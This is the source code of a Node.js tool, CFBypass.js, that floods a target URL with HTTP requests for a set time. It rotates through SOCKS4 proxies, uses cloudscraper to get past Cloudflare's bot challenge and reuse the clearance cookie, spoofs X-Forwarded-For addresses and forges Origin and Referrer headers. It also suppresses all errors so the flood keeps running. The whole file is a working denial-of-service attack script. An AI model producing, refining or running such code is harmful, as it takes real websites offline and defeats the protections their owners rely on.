var cloudscraper = require('cloudscraper');
var request=require('request');
var randomstring = require("randomstring");
var fs = require('fs');
var SocksProxyAgent = require('socks-proxy-agent');

var args = process.argv.slice(2);

randomByte = function() {
    return Math.round(Math.random()*256);
}

if (process.argv.length <= 2) {
    console.log("Usage: node CFBypass.js <url> <time>");
    console.log("Usage: node CFBypass.js <http://example.com> <60>");
    process.exit(-1);
}
let proxies = [...new Set(fs.readFileSync('proxies.txt').toString().match(/\S+/g))];
var url = process.argv[2];
var time = process.argv[3];
setInterval
var int = setInterval(() => {
    
    var cookie = '';
    //const useragent = '';
    
    var item = proxies[Math.floor(Math.random() * proxies.length)];
    var newproxy = 'socks4://' + item;
    var agent = new SocksProxyAgent(newproxy);
    var ip = randomByte() +'.' +
        randomByte() +'.' +
        randomByte() +'.' +
        randomByte();
    cloudscraper.get({
        url: url,
        gzip: true,
        agent: agent,
        headers: {
            'Connection': 'Keep-Alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': 1,
            'User-Agent': [...new Set(fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n'))],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US;q=0.9',
            'X-Forwarded-For': ip
        }
    }, (error, response, body) => {
        var parsed = JSON.parse(JSON.stringify(response));
        cookie = (parsed["request"]["headers"]["cookie"]);
        console.log(cookie)
        var rand = randomstring.generate({
            length: 10,
            charset: 'abcdefghijklmnopqstuvwxyz0123456789'
        });
        var agent2 = new SocksProxyAgent(newproxy);
        const options = {
            url: url,
            gzip: true,
            agent: agent2,
            headers: {
                'User-Agent': [...new Set(fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n'))],
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Upgrade-Insecure-Requests': '1',
                'cookie': cookie,
                'Origin': 'http://' + rand + '.com',
                'Referrer': 'http://google.com/' + rand,
                'X-Forwarded-For': ip
            }
        };
    
        request(options);
    });    
});
setTimeout(() => clearInterval(int), time * 1000);
process.on('uncaughtException', function(err) {
    
});

process.on('unhandledRejection', function(err) {
});